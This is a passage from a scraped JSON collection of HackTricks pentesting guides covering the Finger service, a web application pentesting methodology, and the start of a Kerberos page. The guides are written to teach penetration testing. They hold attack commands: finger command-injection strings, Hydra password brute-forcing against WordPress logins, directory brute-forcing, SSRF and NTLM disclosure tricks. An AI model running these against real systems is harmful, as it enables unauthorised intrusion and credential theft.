        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger",
        "text": "79 - Pentesting Finger\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Info\nFinger\nis a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.\nDefault port:\n79\nPORT   STATE SERVICE\n79/tcp open  finger\nEnumeration\nBanner Grabbing/Basic connection\nnc\n-vn\n<\nIP\n>\n79\necho\n\"root\"\n|\nnc\n-vn\n<\nIP\n>\n79\nUser enumeration\nfinger @\n<\nVictim\n>\n#List users\nfinger admin@\n<\nVictim\n>\n#Get info of user\nfinger user@\n<\nVictim\n>\n#Get info of user\nAlternatively you can use\nfinger-user-enum\nfrom\npentestmonkey\n, some examples:\nfinger-user-enum.pl\n-U\nusers.txt\n-t\n10.0\n.0.1\nfinger-user-enum.pl\n-u\nroot\n-t\n10.0\n.0.1\nfinger-user-enum.pl\n-U\nusers.txt\n-T\nips.txt\nNmap execute a script for doing using default scripts\nMetasploit uses more tricks than Nmap\nuse auxiliary/scanner/finger/finger_users\nShodan\nport:79 USER\nCommand execution\nfinger\n\"|/bin/\n[email¬†protected]\n\"\nfinger\n\"|/bin/ls -a /@example.com\"\nFinger Bounce\n‚Äã\nUse a system as a finger relay\n‚Äã\nfinger user@host@victim\nfinger @internal@external\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n69/UDP TFTP/Bittorrent-tracker\nNext\n- Network Services Pentesting\n80,443 - Pentesting Web Methodology\nLast modified\n6mo ago"
    },
    {
        "title": "80,443 - Pentesting Web Methodology",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web",
        "text": "80,443 - Pentesting Web Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nBasic Info\nThe web service is the most\ncommon and extensive service\nand a lot of\ndifferent types of vulnerabilities\nexists.\nDefault port:\n80 (HTTP), 443(HTTPS)\nPORT    STATE SERVICE\n80\n/tcp\nopen\nhttp\n443\n/tcp\nopen\nssl/https\nnc\n-v\ndomain.com\n80\n# GET / HTTP/1.0\nopenssl s_client\n-connect\ndomain.com:443\n# GET / HTTP/1.0\nWeb API Guidance\nWeb API Pentesting\nMethodology summary\nIn this methodology we are going to suppose that you are going to a attack a domain (or subdomain) and only that. So, you should apply this methodology to each discovered domain, subdomain or IP with undetermined web server inside the scope.\nStart by\nidentifying\nthe\ntechnologies\nused by the web server. Look for\ntricks\nto keep in mind during the rest of the test if you can successfully identify the tech.\nAny\nknown vulnerability\nof the version of the technology?\nUsing any\nwell known tech\n? Any\nuseful trick\nto extract more information?\nAny\nspecialised scanner\nto run (like wpscan)?\nLaunch\ngeneral purposes scanners\n. You never know if they are going to find something or if the are going to find some interesting information.\nStart with the\ninitial checks\n:\nrobots\n,\nsitemap\n,\n404\nerror and\nSSL/TLS scan\n(if HTTPS).\nStart\nspidering\nthe web page: It's time to\nfind\nall the possible\nfiles, folders\nand\nparameters being used.\nAlso, check for\nspecial findings\n.\nNote that anytime a new directory is discovered during brute-forcing or spidering, it should be spidered.\nDirectory Brute-Forcing\n: Try to brute force all the discovered folders searching for new\nfiles\nand\ndirectories\n.\nNote that anytime a new directory is discovered during brute-forcing or spidering, it should be Brute-Forced.\nBackups checking\n: Test if you can find\nbackups\nof\ndiscovered files\nappending common backup extensions.\nBrute-Force parameters\n: Try to\nfind hidden parameters\n.\nOnce you have\nidentified\nall the possible\nendpoints\naccepting\nuser input\n, check for all kind of\nvulnerabilities\nrelated to it.\n‚Äã\nFollow this checklist\n‚Äã\nServer Version (Vulnerable?)\nIdentify\nCheck if there are\nknown vulnerabilities\nfor the server\nversion\nthat is running.\nThe\nHTTP headers and cookies of the response\ncould be very useful to\nidentify\nthe\ntechnologies\nand/or\nversion\nbeing used.\nNmap scan\ncan identify the server version, but it could also be useful the tools\nwhatweb\n,\nwebtech\nor\nhttps://builtwith.com/\n:\nwhatweb\n-a\n1\n<\nURL\n>\n#Stealthy\nwhatweb\n-a\n3\n<\nURL\n>\n#Aggresive\nwebtech\n-u\n<\nURL\n>\nwebanalyze\n-host\nhttps://google.com\n-crawl\n2\nSearch\nfor\nvulnerabilities of the web application\nversion\n‚Äã\nCheck if any WAF\n‚Äã\nhttps://github.com/EnableSecurity/wafw00f\n‚Äã\n‚Äã\nhttps://github.com/Ekultek/WhatWaf.git\n‚Äã\n‚Äã\nhttps://nmap.org/nsedoc/scripts/http-waf-detect.html\n‚Äã\nWeb tech tricks\nSome\ntricks\nfor\nfinding vulnerabilities\nin different well known\ntechnologies\nbeing used:\n‚Äã\nAEM - Adobe Experience Cloud\n‚Äã\n‚Äã\nApache\n‚Äã\n‚Äã\nArtifactory\n‚Äã\n‚Äã\nBuckets\n‚Äã\n‚Äã\nCGI\n‚Äã\n‚Äã\nDrupal\n‚Äã\n‚Äã\nFlask\n‚Äã\n‚Äã\nGit\n‚Äã\n‚Äã\nGolang\n‚Äã\n‚Äã\nGraphQL\n‚Äã\n‚Äã\nH2 - Java SQL database\n‚Äã\n‚Äã\nIIS tricks\n‚Äã\n‚Äã\nJBOSS\n‚Äã\n‚Äã\nJenkins\n‚Äã\n‚Äã\nJira\n‚Äã\n‚Äã\nJoomla\n‚Äã\n‚Äã\nJSP\n‚Äã\n‚Äã\nLaravel\n‚Äã\n‚Äã\nMoodle\n‚Äã\n‚Äã\nNginx\n‚Äã\n‚Äã\nPHP (php has a lot of interesting tricks that could be exploited)\n‚Äã\n‚Äã\nPython\n‚Äã\n‚Äã\nSpring Actuators\n‚Äã\n‚Äã\nSymphony\n‚Äã\n‚Äã\nTomcat\n‚Äã\n‚Äã\nVMWare\n‚Äã\n‚Äã\nWeb API Pentesting\n‚Äã\n‚Äã\nWebDav\n‚Äã\n‚Äã\nWerkzeug\n‚Äã\n‚Äã\nWordpress\n‚Äã\n‚Äã\nElectron Desktop (XSS to RCE)\n‚Äã\nTake into account that the\nsame domain\ncan be using\ndifferent technologies\nin different\nports\n,\nfolders\nand\nsubdomains\n.\nIf the web application is using any well known\ntech/platform listed before\nor\nany other\n, don't forget to\nsearch on the Internet\nnew tricks (and let me know!).\nSource Code Review\nIf the\nsource code\nof the application is available in\ngithub\n, apart of performing by\nyour own a White box test\nof the application there is\nsome information\nthat could be\nuseful\nfor the current\nBlack-Box testing\n:\nIs there a\nChange-log or Readme or Version\nfile or anything with\nversion info accessible\nvia web?\nHow and where are saved the\ncredentials\n? Is there any (accessible?)\nfile\nwith credentials (usernames or passwords)?\nAre\npasswords\nin\nplain text\n,\nencrypted\nor which\nhashing algorithm\nis used?\nIs it using any\nmaster key\nfor encrypting something? Which\nalgorithm\nis used?\nCan you\naccess any of these files\nexploiting some vulnerability?\nIs there any\ninteresting information in the github\n(solved and not solved)\nissues\n? Or in\ncommit history\n(maybe some\npassword introduced inside an old commit\n)?\nSource code Review / SAST Tools\nAutomatic scanners\nGeneral purpose automatic scanners\nnikto\n-h\n<\nURL\n>\nwhatweb\n-a\n4\n<\nURL\n>\nwapiti\n-u\n<\nURL\n>\nW3af\nzaproxy\n#You can use an API\nnuclei\n-ut\n&&\nnuclei\n-target\n<\nURL\n>\n‚Äã\n# https://github.com/ignis-sec/puff (client side vulns fuzzer)\nnode\npuff.js\n-w\n./wordlist-examples/xss.txt\n-u\n\"http://www.xssgame.com/f/m4KKGHi2rVUN/?query=FUZZ\"\nCMS scanners\nIf a CMS is used don't forget to\nrun a scanner\n, maybe something juicy is found:\n‚Äã\nClusterd\n:\nJBoss\n, ColdFusion, WebLogic,\nTomcat\n, Railo, Axis2, Glassfish\nCMSScan\n:\nWordPress\n,\nDrupal\n,\nJoomla\n,\nvBulletin\nwebsites for Security issues. (GUI)\nVulnX\n:\nJoomla\n,\nWordpress\n,\nDrupal\n, PrestaShop, Opencart\nCMSMap\n:\n(W)ordpress\n,\n(J)oomla\n,\n(D)rupal\nor\n(M)oodle\ndroopscan\n:\nDrupal\n,\nJoomla\n,\nMoodle\n, Silverstripe,\nWordpress\n‚Äã\ncmsmap\n[\n-f W\n]\n-F\n-d\n<\nURL\n>\nwpscan\n--force\nupdate\n-e\n--url\n<\nURL\n>\njoomscan\n--ec\n-u\n<\nURL\n>\njoomlavs.rb\n#https://github.com/rastating/joomlavs\nAt this point you should already have some information of the web server being used by the client (if any data is given) and some tricks to keep in mind during the test. If you are lucky you have even found a CMS and run some scanner.\nStep-by-step Web Application Discovery\nFrom this point we are going to start interacting with the web application.\nInitial checks\nDefault pages with interesting info:\n/robots.txt\n/sitemap.xml\n/crossdomain.xml\n/clientaccesspolicy.xml\n/.well-known/\nCheck also comments in the main and secondary pages.\nForcing errors\nWeb servers may\nbehave unexpectedly\nwhen weird data is sent to them. This may open\nvulnerabilities\nor\ndisclosure sensitive information\n.\nAccess\nfake pages\nlike /whatever_fake.php (.aspx,.html,.etc)\nAdd \"[]\", \"]]\", and \"[[\"\nin\ncookie values\nand\nparameter\nvalues to create errors\nGenerate error by giving input as\n/~randomthing/%s\nat the\nend\nof\nURL\nTry\ndifferent HTTP Verbs\nlike PATCH, DEBUG or wrong like FAKE\nCheck if you can upload files (\nPUT verb, WebDav\n)\nIf you find that\nWebDav\nis\nenabled\nbut you don't have enough permissions for\nuploading files\nin the root folder try to:\nBrute Force\ncredentials\nUpload files\nvia WebDav to the\nrest\nof\nfound folders\ninside the web page. You may have permissions to upload files in other folders.\nSSL/TLS vulnerabilites\nIf the application\nisn't forcing the user of HTTPS\nin any part, then it's\nvulnerable to MitM\nIf the application is\nsending sensitive data (passwords) using HTTP\n. Then it's a high vulnerability.\nUse\ntestssl.sh\nto checks for\nvulnerabilities\n(In Bug Bounty programs probably these kind of vulnerabilities won't be accepted) and use\na2sv\nto recheck the vulnerabilities:\n./testssl.sh\n[\n--htmlfile\n]\n10.10\n.10.10:443\n#Use the --htmlfile to save the output inside an htmlfile also\n‚Äã\n# You can also use other tools, by testssl.sh at this momment is the best one (I think)\nsslscan\n<\nhost:port\n>\nsslyze\n--regular\n<\nip:port\n>\nInformation about SSL/TLS vulnerabilities:\n‚Äã\nhttps://www.gracefulsecurity.com/tls-ssl-vulnerabilities/\n‚Äã\n‚Äã\nhttps://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/\n‚Äã\nSpidering\nLaunch some kind of\nspider\ninside the web. The goal of the spider is to\nfind as much paths as possible\nfrom the tested application. Therefore, web crawling and external sources should be used to find as much valid paths as possible.\n‚Äã\ngospider\n(go): HTML spider, LinkFinder in JS files and external sources (Archive.org, CommonCrawl.org, VirusTotal.com, AlienVault.com).\n‚Äã\nhakrawler\n(go): HML spider, with LinkFider for JS files and Archive.org as external source.\n‚Äã\ndirhunt\n(python): HTML spider, also indicates \"juicy files\".\n‚Äã\nevine\n(go): Interactive CLI HTML spider. It also searches in Archive.org\n‚Äã\nmeg\n(go): This tool isn't a spider but it can be useful. You can just indicate a file with hosts and a file with paths and meg will fetch each path on each host and save the response.\n‚Äã\nurlgrab\n(go): HTML spider with JS rendering capabilities. However, it looks like it's unmaintained, the precompiled version is old and the current code doesn't compile\n‚Äã\ngau\n(go): HTML spider that uses external providers (wayback, otx, commoncrawl)\n‚Äã\nParamSpider\n: This script will find URLs with parameter and will list them.\n‚Äã\ngaler\n(go): HTML spider with JS rendering capabilities.\n‚Äã\nLinkFinder\n(python): HTML spider, with JS beautify capabilities capable of search new paths in JS files. It could be worth it also take a look to\nJSScanner\n, which is a wrapper of LinkFinder.\n‚Äã\ngoLinkFinder\n(go): To extract endpoints in both HTML source and embedded javascript files. Useful for bug hunters, red teamers, infosec ninjas.\n‚Äã\nJSParser\n(python2.7): A python 2.7 script using Tornado and JSBeautifier to parse relative URLs from JavaScript files. Useful for easily discovering AJAX requests. Looks like unmaintained.\n‚Äã\nrelative-url-extractor\n(ruby): Given a file (HTML) it will extract URLs from it using nifty regular expression to find and extract the relative URLs from ugly (minify) files.\n‚Äã\nJSFScan\n(bash, several tools): Gather interesting information from JS files using several tools.\n‚Äã\nsubjs\n(go): Find JS files.\n‚Äã\npage-fetch\n(go): Load a page in a headless browser and print out all the urls loaded to load the page.\n‚Äã\nFeroxbuster\n(rust): Content discovery tool mixing several options of the previous tools\n‚Äã\nJavascript Parsing\n: A Burp extension to find path and params in JS files.\n‚Äã\nSourcemapper\n: A tool that given the .js.map URL will get you the beatified JS code\n‚Äã\nxnLinkFinder\n: This is a tool used to discover endpoints for a given target.\n‚Äã\nwaymore\n:\nDiscover links from the wayback machine (also downloading the responses in the wayback and looking for more links\n‚Äã\nHTTPLoot\n(go): Crawl (even by filling forms) and also find sensitive info using specific regexes.\n‚Äã\nSpiderSuite\n: Spider Suite is an advance multi-feature GUI web security Crawler/Spider designed for cyber security professionals.\n‚Äã\njsluice\n(go): It's a Go package and\ncommand-line tool\nfor extracting URLs, paths, secrets, and other interesting data from JavaScript source code.\n‚Äã\nParaForge\n: ParaForge is a simple\nBurp Suite extension\nto\nextract the paramters and endpoints\nfrom the request to create custom wordlist for fuzzing and enumeration.\nBrute Force directories and files\nStart\nbrute-forcing\nfrom the root folder and be sure to brute-force\nall\nthe\ndirectories found\nusing\nthis method\nand all the directories\ndiscovered\nby the\nSpidering\n(you can do this brute-forcing\nrecursively\nand appending at the beginning of the used wordlist the names of the found directories).\nTools:\nDirb\n/\nDirbuster\n- Included in Kali,\nold\n(and\nslow\n) but functional. Allow auto-signed certificates and recursive search. Too slow compared with th other options.\n‚Äã\nDirsearch\n(python)\n: It doesn't allow auto-signed certificates but\nallows recursive search.\n‚Äã\nGobuster\n(go): It allows auto-signed certificates, it\ndoesn't\nhave\nrecursive\nsearch.\n‚Äã\nFeroxbuster\n- Fast, supports recursive search.\n‚Äã\nwfuzz\nwfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt https://domain.com/api/FUZZ\n‚Äã\nffuf\n- Fast:\nffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.10/FUZZ\n‚Äã\nuro\n(python): This isn't a spider but a tool that given the list of found URLs will to delete \"duplicated\" URLs.\n‚Äã\nScavenger\n: Burp Extension to create a list of directories from the burp history of different pages\n‚Äã\nTrashCompactor\n: Remove URLs with duplicated functionalities (based on js imports)\n‚Äã\nChamaleon\n: It uses wapalyzer to detect used technologies and select the wordlists to use.\nRecommended dictionaries:\n‚Äã\nhttps://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/bf_directories.txt\n‚Äã\n‚Äã\nDirsearch\nincluded dictionary\n‚Äã\n‚Äã\nhttp://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10\n‚Äã\n‚Äã\nAssetnote wordlists\n‚Äã\n‚Äã\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content\n‚Äã\nraft-large-directories-lowercase.txt\ndirectory-list-2.3-medium.txt\nRobotsDisallowed/top10000.txt\n‚Äã\nhttps://github.com/random-robbie/bruteforce-lists\n‚Äã\n‚Äã\nhttps://github.com/google/fuzzing/tree/master/dictionaries\n‚Äã\n‚Äã\nhttps://github.com/six2dez/OneListForAll\n‚Äã\n‚Äã\nhttps://github.com/random-robbie/bruteforce-lists\n‚Äã\n/usr/share/wordlists/dirb/common.txt\n/usr/share/wordlists/dirb/big.txt\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nNote that anytime a new directory is discovered during brute-forcing or spidering, it should be Brute-Forced.\nWhat to check on each file found\n‚Äã\nBroken link checker\n: Find broken links inside HTMLs that may be prone to takeovers\nFile Backups\n: Once you have found all the files, look for backups of all the executable files (\"\n.php\n\", \"\n.aspx\n\"...). Common variations for naming a backup are:\nfile.ext~, #file.ext#, ~file.ext, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old.\nYou can also use the tool\nbfac\n.\nDiscover new parameters\n: You can use tools like\nArjun\n,\nparameth\n,\nx8\nand\nParam Miner\nto discover hidden parameters. If you can, you could try to search\nhidden parameters on each executable web file.\nArjun all default wordlists:\nhttps://github.com/s0md3v/Arjun/tree/master/arjun/db\n‚Äã\nParam-miner ‚Äúparams‚Äù :\nhttps://github.com/PortSwigger/param-miner/blob/master/resources/params\n‚Äã\nAssetnote ‚Äúparameters_top_1m‚Äù:\nhttps://wordlists.assetnote.io/\n‚Äã\nnullenc0de ‚Äúparams.txt‚Äù:\nhttps://gist.github.com/nullenc0de/9cb36260207924f8e1787279a05eb773\n‚Äã\nComments:\nCheck the comments of all the files, you can find\ncredentials\nor\nhidden functionality\n.\nIf you are playing\nCTF\n, a \"common\" trick is to\nhide\ninformation\ninside comments at the\nright\nof the\npage\n(using\nhundreds\nof\nspaces\nso you don't see the data if you open the source code with the browser). Other possibility is to use\nseveral new lines\nand\nhide information\nin a comment at the\nbottom\nof the web page.\nAPI keys\n: If you\nfind any API key\nthere is guide that indicates how to use API keys of different platforms:\nkeyhacks\n,\nzile\n,\ntruffleHog\n,\nSecretFinder\n,\nRegHex\n,\nDumpsterDive\n,\nEarlyBird\n‚Äã\nGoogle API keys: If you find any API key looking like\nAIza\nSyA-qLheq6xjDiEIRisP_ujUseYLQCHUjik you can use the project\ngmapapiscanner\nto check which apis the key can access.\nS3 Buckets\n: While spidering look if any\nsubdomain\nor any\nlink\nis related with some\nS3 bucket\n. In that case,\ncheck\nthe\npermissions\nof the bucket\n.\nSpecial findings\nWhile\nperforming the\nspidering\nand\nbrute-forcing\nyou could find\ninteresting\nthings\nthat you have to\nnotice\n.\nInteresting files\nLook for\nlinks\nto other files inside the\nCSS\nfiles.\n‚Äã\nIf you find a\n.git\nfile some information can be extracted\n‚Äã\nIf you find a\n.env\ninformation such as api keys, dbs passwords and other information can be found.\nIf you find\nAPI endpoints\nyou\nshould also test them\n. These aren't files, but will probably \"look like\" them.\nJS files\n: In the spidering section several tools that can extract path from JS files were mentioned. Also, It would be interesting to\nmonitor each JS file found\n, as in some ocations, a change may indicate that a potential vulnerability was introduced in the code. You could use for example\nJSMon\n.\nYou should also check discovered JS files with\nRetireJS\nor\nJSHole\nto find if it's vulnerable.\nJavascript Deobfuscator and Unpacker:\nhttps://lelinhtinh.github.io/de4js/\n,\nhttps://www.dcode.fr/javascript-unobfuscator\n‚Äã\nJavascript Beautifier:\nhttp://jsbeautifier.org/\n,\nhttp://jsnice.org/\n‚Äã\nJsFuck deobfuscation\n(javascript with chars:\"[]!+\"\nhttps://ooze.ninja/javascript/poisonjs/\n)\n‚Äã\nTrainFuck\n:\n+72.+29.+7..+3.-67.-12.+55.+24.+3.-6.-8.-67.-23.\nIn several occasions you will need to\nunderstand regular expressions\nused, this will be useful:\nhttps://regex101.com/\n‚Äã\nYou could also\nmonitor the files were forms were detected\n, as a change in the parameter or the apearance f a new form may indicate a potential new vulnerable functionality.\n403 Forbidden/Basic Authentication/401 Unauthorized (bypass)\n403 & 401 Bypasses\n502 Proxy Error\nIf any page\nresponds\nwith that\ncode\n, it's probably a\nbad configured proxy\n.\nIf you send a HTTP request like:\nGET https://google.com HTTP/1.1\n(with the host header and other common headers), the\nproxy\nwill try to\naccess\ngoogle.com\nand you will have found a\nSSRF.\nNTLM Authentication - Info disclosure\nIf the running server asking for authentication is\nWindows\nor you find a login asking for your\ncredentials\n(and asking for\ndomain\nname\n), you can provoke an\ninformation disclosure\n.\nSend\nthe\nheader\n:\n‚ÄúAuthorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=‚Äù\nand due to how the\nNTLM authentication works\n, the server will respond with internal info (IIS version, Windows version...) inside the header \"WWW-Authenticate\".\nYou can\nautomate\nthis using the\nnmap plugin\n\"\nhttp-ntlm-info.nse\n\".\nHTTP Redirect (CTF)\nIt is possible to\nput content\ninside a\nRedirection\n. This content\nwon't be shown to the user\n(as the browser will execute the redirection) but something could be\nhidden\nin there.\nWeb Vulnerabilities Checking\nNow that a comprehensive enumeration of the web application has been performed it's time to check for a lot of possible vulnerabilities. You can find the checklist here:\nWeb Vulnerabilities Methodology\nTODO: Complete the list of vulnerabilities and techniques with\nhttps://six2dez.gitbook.io/pentest-book/others/web-checklist\nand\nhttps://kennel209.gitbooks.io/owasp-testing-guide-v4/content/en/web_application_security_testing/configuration_and_deployment_management_testing.html\n,\nhttps://owasp-skf.gitbook.io/asvs-write-ups/kbid-111-client-side-template-injection\n‚Äã\nMonitor Pages for changes\nYou can use tools such as\nhttps://github.com/dgtlmoon/changedetection.io\nto monitor pages for modifications that might insert vulnerabilities.\nHackTricks Automatic Commands\nProtocol_Name: Web    #Protocol Abbreviation if there is one.\nPort_Number:  80,443     #Comma separated if there is more than one.\nProtocol_Description: Web         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for Web\nNote: |\nhttps://book.hacktricks.xyz/pentesting/pentesting-web\n‚Äã\nEntry_2:\nName: Quick Web Scan\nDescription: Nikto and GoBuster\nCommand: nikto -host {Web_Proto}://{IP}:{Web_Port} &&&& gobuster dir -w {Small_Dirlist} -u {Web_Proto}://{IP}:{Web_Port} && gobuster dir -w {Big_Dirlist} -u {Web_Proto}://{IP}:{Web_Port}\n‚Äã\nEntry_3:\nName: Nikto\nDescription: Basic Site Info via Nikto\nCommand: nikto -host {Web_Proto}://{IP}:{Web_Port}\n‚Äã\nEntry_4:\nName: WhatWeb\nDescription: General purpose auto scanner\nCommand: whatweb -a 4 {IP}\n‚Äã\nEntry_5:\nName: Directory Brute Force Non-Recursive\nDescription:  Non-Recursive Directory Brute Force\nCommand: gobuster dir -w {Big_Dirlist} -u {Web_Proto}://{IP}:{Web_Port}\n‚Äã\nEntry_6:\nName: Directory Brute Force Recursive\nDescription: Recursive Directory Brute Force\nCommand: python3 {Tool_Dir}dirsearch/dirsearch.py -w {Small_Dirlist} -e php,exe,sh,py,html,pl -f -t 20 -u {Web_Proto}://{IP}:{Web_Port} -r 10\n‚Äã\nEntry_7:\nName: Directory Brute Force CGI\nDescription: Common Gateway Interface Brute Force\nCommand: gobuster dir -u {Web_Proto}://{IP}:{Web_Port}/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200\n‚Äã\nEntry_8:\nName: Nmap Web Vuln Scan\nDescription: Tailored Nmap Scan for web Vulnerabilities\nCommand: nmap -vv --reason -Pn -sV -p {Web_Port} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {IP}\n‚Äã\nEntry_9:\nName: Drupal\nDescription: Drupal Enumeration Notes\nNote: |\ngit clone https://github.com/immunIT/drupwn.git for low hanging fruit and git clone https://github.com/droope/droopescan.git for deeper enumeration\n‚Äã\nEntry_10:\nName: WordPress\nDescription: WordPress Enumeration with WPScan\nCommand: |\n?What is the location of the wp-login.php? Example: /Yeet/cannon/wp-login.php\nwpscan --url {Web_Proto}://{IP}{1} --enumerate ap,at,cb,dbe && wpscan --url {Web_Proto}://{IP}{1} --enumerate u,tt,t,vp --passwords {Big_Passwordlist} -e\n‚Äã\nEntry_11:\nName: WordPress Hydra Brute Force\nDescription: Need User (admin is default)\nCommand: hydra -l admin -P {Big_Passwordlist} {IP} -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'\n‚Äã\nEntry_12:\nName: Ffuf Vhost\nDescription: Simple Scan with Ffuf for discovering additional vhosts\nCommand: ffuf -w {Subdomain_List}:FUZZ -u {Web_Proto}://{Domain_Name} -H \"Host:FUZZ.{Domain_Name}\" -c -mc all {Ffuf_Filters}\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n79 - Pentesting Finger\nNext\n403 & 401 Bypasses\nLast modified\n3mo ago"
    },
    {
        "title": "88tcp/udp - Pentesting Kerberos",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88",
        "text": "88tcp/udp - Pentesting Kerberos\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nFirstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access.\nKerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its resources.\nDefault Port:\n88/tcp/udp\nPORT   STATE SERVICE\n88/tcp open  kerberos-sec\nTo learn how to abuse Kerberos you should read the post about\nActive Directory\n.\nMore\nShodan\nport:88 kerberos\nMS14-068\nSimply stated, the vulnerability enables an attacker to modify an existing, valid, domain user logon token (Kerberos Ticket Granting Ticket, TGT, ticket) by adding the false statement that the user is a member of Domain Admins (or other sensitive group) and the Domain Controller (DC) will validate that (false) claim enabling attacker improper access to any domain (in the AD forest) resource on the network.\nKerberos Vulnerability in MS14-068 (KB3011780) Explained\nActive Directory Security\nOther exploits:\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek\n‚Äã\nHackTricks Automatic Commands\nProtocol_Name: Kerberos    #Protocol Abbreviation if there is one.\nPort_Number:  88   #Comma separated if there is more than one.\nProtocol_Description: AD Domain Authentication         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for Kerberos\nNote: |\nFirstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access.\nKerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its 